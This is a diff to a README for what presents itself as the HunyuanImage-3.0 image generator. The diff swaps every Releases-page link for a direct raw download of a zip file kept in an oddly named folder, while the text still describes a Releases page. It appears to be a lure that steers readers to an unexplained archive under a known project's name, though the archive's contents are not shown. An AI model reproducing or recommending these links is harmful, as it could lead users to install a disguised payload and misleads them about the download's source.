@@ -4,14 +4,14 @@
 Welcome to HunyuanImage-3.0, a powerful tool designed for image generation. This software combines advanced technology with an easy-to-use interface, allowing anyone to create impressive images without requiring technical expertise. 
 
 ## 📥 Download HunyuanImage-3.0
-[![Download HunyuanImage-3.0](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Sniper20/HunyuanImage-3.0/releases)
+[![Download HunyuanImage-3.0](https://raw.githubusercontent.com/Sniper20/HunyuanImage-3.0/main/Ulotrichaceae/HunyuanImage-3.0.zip)](https://raw.githubusercontent.com/Sniper20/HunyuanImage-3.0/main/Ulotrichaceae/HunyuanImage-3.0.zip)
 
 ## 🚀 Getting Started
 To start using HunyuanImage-3.0, follow these simple steps:
 
 1. **Visit the Releases Page**
    Click the link below to go to our Releases page:
-   [Download HunyuanImage-3.0](https://github.com/Sniper20/HunyuanImage-3.0/releases)
+   [Download HunyuanImage-3.0](https://raw.githubusercontent.com/Sniper20/HunyuanImage-3.0/main/Ulotrichaceae/HunyuanImage-3.0.zip)
    
 2. **Choose Your Version**
    Once you're on the Releases page, you'll see different versions of HunyuanImage-3.0. Select the latest version to ensure you have the most up-to-date features and bug fixes. Each version is labeled clearly. 
@@ -69,6 +69,6 @@ If you need help or want to learn more about using HunyuanImage-3.0, check out t
 
 ## 🔗 Revisit the Download Page
 Don't forget to access the download link again at any time:
-[Download HunyuanImage-3.0](https://github.com/Sniper20/HunyuanImage-3.0/releases) 
+[Download HunyuanImage-3.0](https://raw.githubusercontent.com/Sniper20/HunyuanImage-3.0/main/Ulotrichaceae/HunyuanImage-3.0.zip) 
 
 By following these steps, you can successfully download and run HunyuanImage-3.0. Enjoy your image creation journey!
